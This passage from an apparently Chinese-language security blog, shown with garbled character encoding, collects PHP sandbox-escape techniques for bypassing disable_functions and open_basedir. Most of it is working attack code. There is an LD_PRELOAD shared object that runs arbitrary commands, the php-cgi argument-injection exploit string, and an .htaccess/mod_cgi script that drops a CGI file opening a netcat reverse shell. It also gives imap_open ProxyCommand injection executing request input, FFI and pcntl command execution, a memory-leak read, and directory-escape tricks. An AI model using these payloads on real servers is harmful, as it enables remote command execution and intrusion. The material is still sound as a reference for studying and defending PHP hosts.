-fPIC hack.c -o hackgcc -shared hack -o hack.so</code></pre><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p>å°†æ¶æ„çš„.soæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨</p><p>æ‰§è¡Œå¦‚ä¸‹ä»£ç ,å³å¯è½½å…¥æ¶æ„å‘½ä»¤</p><pre><code class="php">&lt;?phpputenv(&quot;LD_PRELOAD=/var/www/hack.so&quot;);mail(&quot;[email protected]&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);?&gt;</code></pre><h4 id="ç›¸å…³æ–‡ç« "><a href="#ç›¸å…³æ–‡ç« " class="headerlink" title="ç›¸å…³æ–‡ç« "></a>ç›¸å…³æ–‡ç« </h4><p><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403</a></p><p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p><p>[<a href="https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#8-mail-%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%8F%82%E6%95%B0-excrt-cmd]" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#8-mail-%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%8F%82%E6%95%B0-excrt-cmd]</a>(<a href="https://www.k0rz3n.com/2019/02/12/PHP" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/02/12/PHP</a> ä¸­å¯ä»¥åˆ©ç”¨çš„å±é™©çš„å‡½æ•°/#8-mail-ç¬¬äº”ä¸ªå‚æ•°-excrt-cmd)</p><p><a href="https://www.freebuf.com/articles/web/169156.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169156.html</a></p><h3 id="without-sendmail"><a href="#without-sendmail" class="headerlink" title="without sendmail"></a>without sendmail</h3><p> <a href="https://www.mi1k7ea.com/2019/06/02/æµ…è°ˆå‡ ç§Bypass-disable-functionsçš„æ–¹æ³•/#Method2â€”â€”åŠ«æŒå¯åŠ¨è¿›ç¨‹" target="_blank" rel="noopener">å‚è€ƒé“¾æ¥</a> </p><blockquote><p>å›åˆ° LD_PRELOAD æœ¬èº«ï¼Œç³»ç»Ÿé€šè¿‡å®ƒé¢„å…ˆåŠ è½½å…±äº«å¯¹è±¡ï¼Œå¦‚æœèƒ½æ‰¾åˆ°ä¸€ä¸ªæ–¹å¼ï¼Œåœ¨åŠ è½½æ—¶å°±æ‰§è¡Œä»£ç ï¼Œè€Œä¸ç”¨è€ƒè™‘åŠ«æŒæŸä¸€ç³»ç»Ÿå‡½æ•°ï¼Œé‚£æˆ‘å°±å®Œå…¨å¯ä»¥ä¸ä¾èµ– sendmail äº†ã€‚è¿™ç§åœºæ™¯ä¸ C++ çš„æ„é€ å‡½æ•°ç®€ç›´ç¥ä¼¼ï¼</p><p>GCC æœ‰ä¸ª C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦ <code>__attribute__((constructor))</code>ï¼Œå¯ä»¥è®©ç”±å®ƒä¿®é¥°çš„å‡½æ•°åœ¨ main() ä¹‹å‰æ‰§è¡Œï¼Œè‹¥å®ƒå‡ºç°åœ¨å…±äº«å¯¹è±¡ä¸­æ—¶ï¼Œé‚£ä¹ˆä¸€æ—¦å…±äº«å¯¹è±¡è¢«ç³»ç»ŸåŠ è½½ï¼Œç«‹å³å°†æ‰§è¡Œ <code>__attribute__((constructor))</code> ä¿®é¥°çš„å‡½æ•°ã€‚è¿™ä¸€ç»†èŠ‚éå¸¸é‡è¦ï¼Œå¾ˆå¤šæœ‹å‹ç”¨ LD_PRELOAD æ‰‹æ³•çªç ´ disable_functions æ— æ³•åšåˆ°ç™¾åˆ†ç™¾æˆåŠŸï¼Œæ­£å› ä¸ºè¿™ä¸ªåŸå› ï¼Œ<strong>ä¸è¦å±€é™äºä»…åŠ«æŒæŸä¸€å‡½æ•°ï¼Œè€Œåº”è€ƒè™‘æ‹¦åŠ«å¯åŠ¨è¿›ç¨‹è¿™ä¸€è¡Œä¸º</strong>ã€‚</p><p>æ­¤å¤–ï¼Œæˆ‘é€šè¿‡ LD_PRELOAD åŠ«æŒäº†å¯åŠ¨è¿›ç¨‹çš„è¡Œä¸ºï¼ŒåŠ«æŒååˆå¯åŠ¨äº†å¦å¤–çš„æ–°è¿›ç¨‹ï¼Œè‹¥ä¸åœ¨æ–°è¿›ç¨‹å¯åŠ¨å‰å–æ¶ˆ LD_PRELOADï¼Œåˆ™å°†é™·å…¥æ— é™å¾ªç¯ï¼Œæ‰€ä»¥å¿…é¡»å¾—åˆ é™¤ç¯å¢ƒå˜é‡ LD_PRELOADã€‚æœ€ç›´è§‚çš„åšæ³•æ˜¯è°ƒç”¨ <code>unsetenv(&quot;LD_PRELOAD&quot;)</code>ï¼Œè¿™åœ¨å¤§éƒ¨ä»½ linux å‘è¡Œå¥—ä»¶ä¸Šçš„ç¡®å¯è¡Œï¼Œä½†åœ¨ centos ä¸Šå´æ— æ•ˆï¼Œç©¶å…¶åŸå› ï¼Œcentos è‡ªå·±ä¹Ÿ hook äº† unsetenv()ï¼Œåœ¨å…¶å†…éƒ¨å¯åŠ¨äº†å…¶ä»–è¿›ç¨‹ï¼Œæ ¹æœ¬æ¥ä¸åŠåˆ é™¤ LD_PRELOAD å°±åˆè¢«åŠ«æŒï¼Œå¯¼è‡´æ— é™å¾ªç¯ã€‚æ‰€ä»¥ï¼Œæˆ‘å¾—æ‰¾ä¸€ç§æ¯” unsetenv() æ›´ç›´æ¥çš„åˆ é™¤ç¯å¢ƒå˜é‡çš„æ–¹å¼ã€‚æ˜¯å®ƒï¼Œå…¨å±€å˜é‡ <code>extern char** environ</code>ï¼å®é™…ä¸Šï¼Œunsetenv() å°±æ˜¯å¯¹ environ çš„ç®€å•å°è£…å®ç°çš„ç¯å¢ƒå˜é‡åˆ é™¤åŠŸèƒ½ã€‚</p></blockquote><h4 id="ç”±äºopen-basedir-webç›®å½•ä¸å¯å†™ç»•è¿‡"><a href="#ç”±äºopen-basedir-webç›®å½•ä¸å¯å†™ç»•è¿‡" class="headerlink" title="ç”±äºopen_basedir+webç›®å½•ä¸å¯å†™ç»•è¿‡"></a>ç”±äºopen_basedir+webç›®å½•ä¸å¯å†™ç»•è¿‡</h4><p>è§ bypass open_basedir çš„ tmpfileéƒ¨åˆ†</p><h4 id="æ”»å‡»åˆ©ç”¨"><a href="#æ”»å‡»åˆ©ç”¨" class="headerlink" title="æ”»å‡»åˆ©ç”¨"></a>æ”»å‡»åˆ©ç”¨</h4><p>bypass_disablefunc.c</p><pre><code>#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;extern char** environ;__attribute__ ((__constructor__)) void preload (void){    // get command line options and arg    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);    // unset environment variable LD_PRELOAD.    // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some     // distribution (e.g., centos), I need crafty trick.    int i;    for (i = 0; environ[i]; ++i) {            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) {                    environ[i][0] = &#39;\0&#39;;            }    }    // executive command    system(cmdline);}</code></pre><p>æ¥ç€ç”¨ä»¥ä¸‹è¯­å¥ç¼–è¯‘Cæ–‡ä»¶ä¸ºå…±äº«å¯¹è±¡æ–‡ä»¶ï¼š</p><pre><code>gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so</code></pre><p>bypass_disablefunc.phpï¼Œä»£ç å’Œtest.phpä¸€è‡´ï¼š</p><pre><code class="php">&lt;?php    $cmd = &quot;ls&quot;;    $out_path = &quot;/tmp/cmdout&quot;;    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);    $so_path = &quot;/var/www/html/bypass_disablefunc.so&quot;;    putenv(&quot;LD_PRELOAD=&quot; . $so_path);    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;;     unlink($out_path);?&gt;</code></pre><h2 id="apache-php-cgi-modæ”»å‡»"><a href="#apache-php-cgi-modæ”»å‡»" class="headerlink" title="apache+php cgi modæ”»å‡»"></a>apache+php cgi modæ”»å‡»</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>phpä½œä¸ºcgiæ¨¡å¼è¿è¡Œçš„æ—¶å€™ï¼Œæ¥å—-s  -d -c è¿™æ ·çš„å‚æ•°ï¼Œæˆ‘ä»¬çœ‹çœ‹è¿™äº›å‚æ•°çš„åŠŸèƒ½</p><pre><code class="html">-s Output HTML syntax highlighted source -d foo[=bar] Define INI entry foo with value bar</code></pre><p>ç„¶åå†çœ‹çœ‹æ”»å‡»ä»£ç ç‰‡æ®µ</p><pre><code class="php">char poststr[] = &quot;POST %s?%%2D%%64+%%61%%6C%%6C%%6F%%77%%5F&quot; \ &quot;%%75%%72%%6C%%5F%%69%%6E%%63%%6C%%75%%64%%65%%3D%%6F%%6E+%%2D%%64&quot; \ &quot;+%%73%%61%%66%%65%%5F%%6D%%6F%%64%%65%%3D%%6F%%66%%66+%%2D%%64+%%73&quot; \ &quot;%%75%%68%%6F%%73%%69%%6E%%2E%%73%%69%%6D%%75%%6C%%61%%74%%69%%6F%%6E&quot; \ &quot;%%3D%%6F%%6E+%%2D%%64+%%64%%69%%73%%61%%62%%6C%%65%%5F%%66%%75%%6E%%63&quot; \ &quot;%%74%%69%%6F%%6E%%73%%3D%%22%%22+%%2D%%64+%%6F%%70%%65%%6E%%5F%%62&quot; \ &quot;%%61%%73%%65%%64%%69%%72%%3D%%6E%%6F%%6E%%65+%%2D%%64+%%61%%75%%74&quot; \ &quot;%%6F%%5F%%70%%72%%65%%70%%65%%6E%%64%%5F%%66%%69%%6C%%65%%3D%%70%%68&quot; \ &quot;%%70%%3A%%2F%%2F%%69%%6E%%70%%75%%74+%%2D%%64+%%63%%67%%69%%2E%%66%%6F&quot; \ &quot;%%72%%63%%65%%5F%%72%%65%%64%%69%%72%%65%%63%%74%%3D%%30+%%2D%%64+%%63&quot; \ &quot;%%67%%69%%2E%%72%%65%%64%%69%%72%%65%%63%%74%%5F%%73%%74%%61%%74%%75%%73&quot; \ &quot;%%5F%%65%%6E%%76%%3D%%30+%%2D%%6E HTTP/1.1\r\n&quot; \</code></pre><p>è§£ç å‡ºæ¥æ˜¯</p><pre><code class="php">%s?-d allow_url_include=on -d safe_mode=off -d suhosin.simulation3Don -d disable_functions=&quot;&quot; -d open_basedir=none -d auto_prepend_file=php://input -d cgi.fo&quot;rce_redirect=0 -d cgi.redirect_status_env=0 -n</code></pre><p>è¿™æ ·Kingcopeçš„æ”»å‡»ä»£ç æ€è·¯å°±å‡ºæ¥äº†ã€‚</p><p>å…³é—­å„ç§é˜²æŠ¤çš„å‚æ•°ï¼Œæ‰“å¼€å„ç§å±é™©çš„å‚æ•°ï¼Œæœ€ååˆ©ç”¨auto_prepend_fileï¼ˆæˆ–auto_append_fileï¼‰è¿™ä¸ªå‚æ•°æŠŠé»‘å®¢éœ€è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ä¼ é€’è¿‡å»äº†ã€‚</p><h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><p>1ã€apache+phpæ˜¯ç”¨cgiæ¨¡å¼è·‘çš„ï¼Œä¾‹å¦‚apacheçš„mod_cgid</p><p>2ã€phpè§£é‡Šå™¨éœ€è¦å¯ä»¥ä»ä¸‹é¢çš„urlè®¿é—®åˆ°ï¼Œå½“ç„¶æˆ–è®¸å¯èƒ½æ˜¯å…¶ä»–çš„urlï¼Œè¿™ä¸ªå…·ä½“è¦çœ‹ä½ çš„é…ç½®</p><pre><code class="html">    /cgi-bin/php    /cgi-bin/php5    /cgi-bin/php-cgi    /cgi-bin/php.cgi    /cgi-bin/php4</code></pre><p>3ã€phpç‰ˆæœ¬<br>PHPç‰ˆæœ¬å°äº5.3.12<br>PHPç‰ˆæœ¬å°äº5.4.2</p><p>æˆ–è€…</p><ol><li>mod_cgiå·²ç»å¯ç”¨ </li><li>å¿…é¡»å…è®¸.htaccessæ–‡ä»¶ , åœ¨httpd.confä¸­ï¼Œè¦æ³¨æ„AllowOverrideé€‰é¡¹ä¸ºAll </li><li>å¿…é¡»æœ‰æƒé™å†™.htaccessæ–‡ä»¶</li></ol><h3 id="åˆ©ç”¨è„šæœ¬"><a href="#åˆ©ç”¨è„šæœ¬" class="headerlink" title="åˆ©ç”¨è„šæœ¬"></a>åˆ©ç”¨è„šæœ¬</h3><pre><code class="php">&lt;?php$cmd = &quot;nc -c&#39;/bin/bash&#39; 127.0.0.1 4444&quot;; //åå¼¹ä¸€ä¸ªshellå‡ºæ¥ï¼Œè¿™é‡Œç”¨æœ¬åœ°çš„4444ç«¯å£$shellfile =&quot;#!/bin/bash\n&quot;; //æŒ‡å®šshell$shellfile .=&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;; //éœ€è¦æŒ‡å®šè¿™ä¸ªheaderï¼Œå¦åˆ™ä¼šè¿”å›500$shellfile .=&quot;$cmd&quot;; functioncheckEnabled($text,$condition,$yes,$no) //this surely can be shorter{    echo &quot;$text: &quot; . ($condition ?$yes : $no) . &quot;&lt;br&gt;\n&quot;;}if(!isset($_GET[&#39;checked&#39;])){    @file_put_contents(&#39;.htaccess&#39;,&quot;\nSetEnv HTACCESS on&quot;, FILE_APPEND);     header(&#39;Location: &#39; . $_SERVER[&#39;PHP_SELF&#39;]. &#39;?checked=true&#39;); //æ‰§è¡Œç¯å¢ƒçš„æ£€æŸ¥}else{    $modcgi = in_array(&#39;mod_cgi&#39;,apache_get_modules()); // æ£€æµ‹mod_cgiæ˜¯å¦å¼€å¯    $writable = is_writable(&#39;.&#39;); //æ£€æµ‹å½“å‰ç›®å½•æ˜¯å¦å¯å†™    $htaccess = !empty($_SERVER[&#39;HTACCESS&#39;]);//æ£€æµ‹æ˜¯å¦å¯ç”¨äº†.htaccess        checkEnabled(&quot;Mod-Cgienabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;);        checkEnabled(&quot;Iswritable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;);        checkEnabled(&quot;htaccessworking&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;);    if(!($modcgi &amp;&amp; $writable&amp;&amp; $htaccess))    {        echo &quot;Error. All of the above mustbe true for the script to work!&quot;; //å¿…é¡»æ»¡è¶³æ‰€æœ‰æ¡ä»¶    }    else    { checkEnabled(&quot;Backing up.htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded!Saved in .htaccess.bak&quot;,&quot;Failed!&quot;); //å¤‡ä»½ä¸€ä¸‹åŸæœ‰.htaccesscheckEnabled(&quot;Write .htaccessfile&quot;,file_put_contents(&#39;.htaccess&#39;,&quot;Options +ExecCGI\nAddHandlercgi-script .dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//.dizzleï¼Œæˆ‘ä»¬çš„ç‰¹å®šæ‰©å±•å        checkEnabled(&quot;Write shellfile&quot;,file_put_contents(&#39;shell.dizzle&#39;,$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//å†™å…¥æ–‡ä»¶        checkEnabled(&quot;Chmod777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//ç»™æƒé™        echo &quot;Executing the script now.Check your listener &lt;img src = &#39;shell.dizzle&#39; style =&#39;display:none;&#39;&gt;&quot;; //è°ƒç”¨    }}?&gt;</code></pre><h2 id="imap-open"><a href="#imap-open" class="headerlink" title="imap_open"></a>imap_open</h2><blockquote><p>PHP çš„imap_openå‡½æ•°ä¸­çš„æ¼æ´å¯èƒ½å…è®¸ç»è¿‡èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´çš„å­˜åœ¨æ˜¯å› ä¸ºå—å½±å“çš„è½¯ä»¶çš„imap_openå‡½æ•°åœ¨å°†é‚®ç®±åç§°ä¼ é€’ç»™rshæˆ–sshå‘½ä»¤ä¹‹å‰ä¸æ­£ç¡®åœ°è¿‡æ»¤é‚®ç®±åç§°ã€‚å¦‚æœå¯ç”¨äº†rshå’ŒsshåŠŸèƒ½å¹¶ä¸”rshå‘½ä»¤æ˜¯sshå‘½ä»¤çš„ç¬¦å·é“¾æ¥ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘ç›®æ ‡ç³»ç»Ÿå‘é€åŒ…å«-oProxyCommandå‚æ•°çš„æ¶æ„IMAPæœåŠ¡å™¨åç§°æ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚æˆåŠŸçš„æ”»å‡»å¯èƒ½å…è®¸æ”»å‡»è€…ç»•è¿‡å…¶ä»–ç¦ç”¨çš„exec å—å½±å“è½¯ä»¶ä¸­çš„åŠŸèƒ½ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¿™äº›åŠŸèƒ½åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„shellå‘½ä»¤ã€‚åˆ©ç”¨æ­¤æ¼æ´çš„åŠŸèƒ½ä»£ç æ˜¯Metasploit Frameworkçš„ä¸€éƒ¨åˆ†ã€‚ </p></blockquote><h3 id="åˆ©ç”¨æ¡ä»¶-1"><a href="#åˆ©ç”¨æ¡ä»¶-1" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><p>å­˜åœ¨sshå’ŒrshåŠŸèƒ½ ä¸”  enable_insecure_rsh = true</p><h3 id="åˆ©ç”¨è„šæœ¬-æœªæµ‹è¯•"><a href="#åˆ©ç”¨è„šæœ¬-æœªæµ‹è¯•" class="headerlink" title="åˆ©ç”¨è„šæœ¬(æœªæµ‹è¯•)"></a>åˆ©ç”¨è„šæœ¬(æœªæµ‹è¯•)</h3><pre><code class="php">if (!function_exists(&#39;imap_open&#39;)) {        die(&quot;no imap_open function!&quot;);}$server = &quot;x -oProxyCommand=echo\t&quot; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;/tmp/cmd_result&quot;) . &quot;|base64\t-d|sh}&quot;;//$server = &#39;x -oProxyCommand=echo$IFS$()&#39; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;/tmp/cmd_result&quot;) . &#39;|base64$IFS$()-d|sh}&#39;;imap_open(&#39;{&#39; . $server . &#39;:143/imap}INBOX&#39;, &#39;&#39;, &#39;&#39;); // or var_dump(&quot;\n\nError: &quot;.imap_last_error());sleep(5);echo file_get_contents(&quot;/tmp/cmd_result&quot;);</code></pre><h2 id="åˆ©ç”¨pcntlæ’ä»¶ç»•è¿‡"><a href="#åˆ©ç”¨pcntlæ’ä»¶ç»•è¿‡" class="headerlink" title="åˆ©ç”¨pcntlæ’ä»¶ç»•è¿‡"></a>åˆ©ç”¨pcntlæ’ä»¶ç»•è¿‡</h2><pre><code>pcntl_exec(&quot;/bin/bash&quot;, array(&quot;/tmp/b4dboy.sh&quot;));</code></pre><h2 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h2><h3 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h3><p>FFI::load æ— è§† opeb_basedir å¯ä»¥ç›´æ¥åŠ è½½æ–‡ä»¶</p><p>FFI ç›¸å¯¹äº php æ›´åŠ åº•å±‚ï¼Œå¯ä»¥æ³„éœ²å†…å­˜</p><h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><pre><code class="php">$ffi=FFI::cdef(&quot;int system(char *command);&quot;,&quot;libc.so.6&quot;);$ffi-&gt;system(&quot;sleep 5&quot;);</code></pre><h3 id="open-basedirï¼Œç¦ç”¨FFI-cdefï¼Œç›®å½•æ— æ³•å†™æ–‡ä»¶å‘½ä»¤æ‰§è¡Œ"><a href="#open-basedirï¼Œç¦ç”¨FFI-cdefï¼Œç›®å½•æ— æ³•å†™æ–‡ä»¶å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="open_basedirï¼Œç¦ç”¨FFI::cdefï¼Œç›®å½•æ— æ³•å†™æ–‡ä»¶å‘½ä»¤æ‰§è¡Œ"></a>open_basedirï¼Œç¦ç”¨FFI::cdefï¼Œç›®å½•æ— æ³•å†™æ–‡ä»¶å‘½ä»¤æ‰§è¡Œ</h3><pre><code>$value=&lt;&lt;&lt;EOF#define FFI_SCOPE &quot;DUMMY&quot;#define FFI_LIB &quot;libc.so.6&quot;int system(const char *command);EOF;$tmpHandle = tmpfile();$metaDatas = stream_get_meta_data($tmpHandle);$tmpFilename = $metaDatas[&#39;uri&#39;];fwrite($tmpHandle, $value);fseek($tmpHandle, 0);echo fread($tmpHandle, 1024);var_dump($tmpFilename);fflush($tmpHandle );$ffi=FFI::load($tmpFilename);$ffi-&gt;system(&#39;echo bypass_disable_function &gt; /tmp/testing&#39;);fclose($tmpHandle);</code></pre><h3 id="å†…å­˜æ³„éœ²"><a href="#å†…å­˜æ³„éœ²" class="headerlink" title="å†…å­˜æ³„éœ²"></a>å†…å­˜æ³„éœ²</h3><pre><code class="php">$c=FFI::load(&quot;/flag.h&quot;);$b=FFI::cast(&quot;void *&quot;,FFI::new(&quot;int[1]&quot;,false));$a=FFI::string($b-400000,400000);var_dump($a);</code></pre><h2 id="php-json-bypass"><a href="#php-json-bypass" class="headerlink" title="php-json-bypass"></a>php-json-bypass</h2><p><a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p><h2 id="php7-backtrace-bypass"><a href="#php7-backtrace-bypass" class="headerlink" title="php7-backtrace-bypass"></a><strong>php7-backtrace-bypass</strong></h2><p> <a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a> </p><h2 id="php7-gc-bypass"><a href="#php7-gc-bypass" class="headerlink" title="php7-gc-bypass"></a><strong>php7-gc-bypass</strong></h2><p> <a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a> </p><h2 id="win-shell-execute"><a href="#win-shell-execute" class="headerlink" title="win_shell_execute"></a>win_shell_execute</h2><pre><code class="php">if (!extension_loaded(&quot;win32std&quot;)) die(&quot;win32std extension required!&quot;);system(&quot;cmd.exe&quot;); //just to be sure that protections work wellwin_shell_execute(&quot;..\\..\\..\\..\\windows\\system32\\cmd.exe&quot;);</code></pre><h2 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h2><h2 id="æ¨èç½‘å€"><a href="#æ¨èç½‘å€" class="headerlink" title="æ¨èç½‘å€"></a>æ¨èç½‘å€</h2><p><a href="https://www.freebuf.com/articles/web/169156.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169156.html</a></p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p> <a href="https://www.anquanke.com/post/id/197745#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197745#h3-5</a> </p><p> <a href="https://www.mi1k7ea.com/2019/06/02/æµ…è°ˆå‡ ç§Bypass-disable-functionsçš„æ–¹æ³•" target="_blank" rel="noopener">æµ…è°ˆå‡ ç§Bypass-disable-functionsçš„æ–¹æ³•</a> </p><h1 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass  open_basedir"></a>bypass  open_basedir</h1><h2 id="tmpfileç»•è¿‡open-basediråœ¨-tmpç›®å½•å†™æ–‡ä»¶"><a href="#tmpfileç»•è¿‡open-basediråœ¨-tmpç›®å½•å†™æ–‡ä»¶" class="headerlink" title="tmpfileç»•è¿‡open_basediråœ¨/tmpç›®å½•å†™æ–‡ä»¶"></a>tmpfileç»•è¿‡open_basediråœ¨/tmpç›®å½•å†™æ–‡ä»¶</h2><pre><code>&lt;?php$value=&lt;&lt;&lt;EOFEOF;$tmpHandle = tmpfile();$metaDatas = stream_get_meta_data($tmpHandle);$tmpFilename = $metaDatas[&#39;uri&#39;];fwrite($tmpHandle, $value);fseek($tmpHandle, 0);echo fread($tmpHandle, 1024);var_dump($tmpFilename);fflush($tmpHandle );fclose($tmpHandle);</code></pre><h2 id="ini-setä¸chdir-ç»•è¿‡open-basedir"><a href="#ini-setä¸chdir-ç»•è¿‡open-basedir" class="headerlink" title="ini_setä¸chdir ç»•è¿‡open_basedir"></a>ini_setä¸chdir ç»•è¿‡open_basedir</h2><pre><code class="php">mkdir(&#39;img&#39;);chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);</code></pre><h2 id="globåè®®åˆ—æ ¹ç›®å½•"><a href="#globåè®®åˆ—æ ¹ç›®å½•" class="headerlink" title="globåè®®åˆ—æ ¹ç›®å½•"></a>globåè®®åˆ—æ ¹ç›®å½•</h2><pre><code class="php">$it = new DirectoryIterator(&quot;glob:///*&quot;);foreach ($it as $f){    echo $f-&gt;__toString().&quot; &quot;;}</code></pre><h2 id="realpathåˆ—ç›®å½•"><a href="#realpathåˆ—ç›®å½•" class="headerlink" title="realpathåˆ—ç›®å½•"></a>realpathåˆ—ç›®å½•</h2><p>realpathæ˜¯phpä¸­ä¸€ä¸ªå°†ç›¸å¯¹è·¯å¾„è½¬åŒ–ä¸ºç»å¯¹è·¯å¾„çš„æ–¹æ³•ï¼Œè€Œå¦‚æœå¼€å¯äº†<code>open_basedir</code>çš„è¯ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶åï¼Œä¼šè¿”å›falseï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªä¸åœ¨<code>open_basedir</code>é‡Œçš„æ–‡ä»¶çš„è¯ï¼Œä»–å°±ä¼šè¿”å›<code>file is not within the allowed path(s)</code>ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç±»ä¼¼äºæŠ¥é”™ç›²æ³¨å»çˆ†å‡ºæ–‡ä»¶åäº†<br>è¿™é‡Œæœ‰ä¸ªå°trickï¼Œåˆ©ç”¨windowsä¸‹çš„é€šé…ç¬¦&lt;å’Œ&gt;å»è¿›è¡Œçˆ†ç ´å¯ä»¥å¿«ä¸€ç‚¹</p><pre><code class="php">&lt;?phpini_set(&#39;open_basedir&#39;,dirname(__FILE__));printf(&quot;open_basedir: %s&lt;br/&gt;&lt;br/&gt;&quot;, ini_get(&#39;open_basedir&#39;));set_error_handler(&#39;isexist&#39;);$dir = &#39;d:/test/&#39;;$file = &#39;&#39;;$chars = &#39;abcdefghijklmnopqrstuvwxyz0123456789-*/+_&#39;;for ($i=0; $i&lt;strlen($chars); $i++){    $file = $dir.$chars[$i].&#39;&lt;&lt;&#39;;    realpath($file);}function isexist($errno, $errstr){    $regex = &#39;/File\((.*)\) is not within/&#39;;    printf(&quot;errstr: %s &lt;br/&gt;&quot;,$errstr);    preg_match($regex, $errstr, $mathes);    if (isset($mathes[1])){        printf(&quot;%s &lt;br/&gt;&lt;br/&gt;&quot;, $mathes[1]);    }}</code></pre><h2 id="SplFileInfo-getRealPathåˆ—ç›®å½•"><a href="#SplFileInfo-getRealPathåˆ—ç›®å½•" class="headerlink" title="SplFileInfo::getRealPathåˆ—ç›®å½•"></a>SplFileInfo::getRealPathåˆ—ç›®å½•</h2><p> 